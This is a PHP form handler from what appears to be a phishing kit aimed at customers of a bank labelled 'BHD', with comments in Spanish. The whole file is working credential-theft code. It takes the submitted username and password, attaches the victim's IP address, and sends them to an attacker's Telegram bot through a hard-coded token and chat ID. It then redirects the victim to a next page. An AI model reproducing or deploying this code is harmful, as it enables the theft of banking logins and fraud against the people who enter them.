<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST["user"];
    $pass = $_POST["pass"];
  $botToken = "8912252632:AAEJf_puzYmDrMbn_Y2kOqhWAMgc-wBc0VI"; // Reemplaza con tu token de bot
    $chatID = "8555745789"; // Reemplaza con tu chat ID

    // Obtén la IP del cliente
    $ip = $_SERVER['REMOTE_ADDR'];

    // Construye el mensaje
    $message = "=====DATOS BHD=======\nUser: $user\nClave: $pass\nIP del cliente: $ip";

    // Envia el mensaje a Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array("chat_id" => $chatID, "text" => $message);
    $options = array(
        "http" => array(
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
            "content" => http_build_query($data)
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result) {
        // Redirige a la página de éxito
        header("Location: pa01.php");
        exit; // Asegura que el script se detenga después de la redirección
    } else {
        // Redirige a la página de error
        header("Location: index");
        exit;
    }
}
?>